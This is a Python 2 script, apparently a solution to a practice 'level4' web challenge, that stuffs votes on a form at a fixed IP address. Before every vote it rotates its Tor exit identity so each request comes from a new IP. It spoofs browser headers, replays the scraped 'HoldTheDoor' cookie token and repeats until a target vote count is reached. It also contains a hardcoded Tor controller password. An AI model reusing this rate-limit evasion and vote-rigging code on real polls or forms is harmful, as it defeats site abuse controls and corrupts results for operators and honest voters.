import urllib2, urllib,cookielib
from stem import Signal
from stem.control import Controller
import socket
import socks

#configuration start
id_number=40
votes=98
#configuration end

#initialization start
vote_counter=0
default_socket = socket.socket
SOCKS5_PROXY_HOST = 'localhost'
SOCKS5_PROXY_PORT = 9050
#initialization end

def use_tor():
    socket.socket = default_socket
    controller.signal(Signal.NEWNYM)
    socks.set_default_proxy(socks.SOCKS5, SOCKS5_PROXY_HOST, SOCKS5_PROXY_PORT)
    socket.socket = socks.socksocket
    generate_vote()

def generate_vote():
    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    opener.addheaders=[
        ('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'),
        ('Referer', 'http://173.246.108.142/level4.php'),
    ]
    session = opener.open('http://173.246.108.142/level4.php')
    if session.getcode() == 200:
        for cookie in cj:
            if cookie.name=='HoldTheDoor':
                params = { 'id': id_number, 'holdthedoor': 'Submit', 'key': cookie.value }
        url_params = urllib.urlencode(params) # url encode the parameters
        post=opener.open('http://173.246.108.142/level4.php', url_params)
        if post.getcode() == 200:
            resp = post.read()
            if resp != "You already voted today. See you later hacker! [12]":
                global vote_counter
                vote_counter+=1
                print "Vote\033[1m", vote_counter, "\033[0mhas been submitted!"
            else:
                print "Trying again..."
        else:
            print "Vote", vote_counter, "failed with status", post.getcode()
    else:
            print "Failed to open a session, returned with error code:", session.getcode()
    opener.close()

#instructions start
print "Please standby..."
#instruction end

#threading start
with Controller.from_port(port = 9051) as controller:
    controller.authenticate("Floopowder7")
    while(vote_counter < votes):
        use_tor()

#Summary start
print "\033[94m# of votes that were requested:", votes
print "# of successful votes:", vote_counter, "\033[0m"
if (votes - vote_counter) != 0:
    print "\033[93m# of failed votes:", votes - vote_counter, "\033[0m"
#Summary end
